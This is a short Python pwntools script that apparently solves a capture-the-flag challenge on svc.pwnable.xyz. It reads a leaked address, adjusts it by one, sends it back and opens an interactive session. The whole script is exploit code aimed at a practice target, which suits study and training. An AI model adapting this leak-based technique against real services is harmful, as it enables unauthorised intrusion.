from pwn import *

p = remote("svc.pwnable.xyz", 30000)

p.recvuntil("Leak: ")
leak = int(p.recvline()[:-1], 16) + 1

p.sendlineafter("message: ", str(leak))
p.sendafter("message: ", b"a")
p.interactive()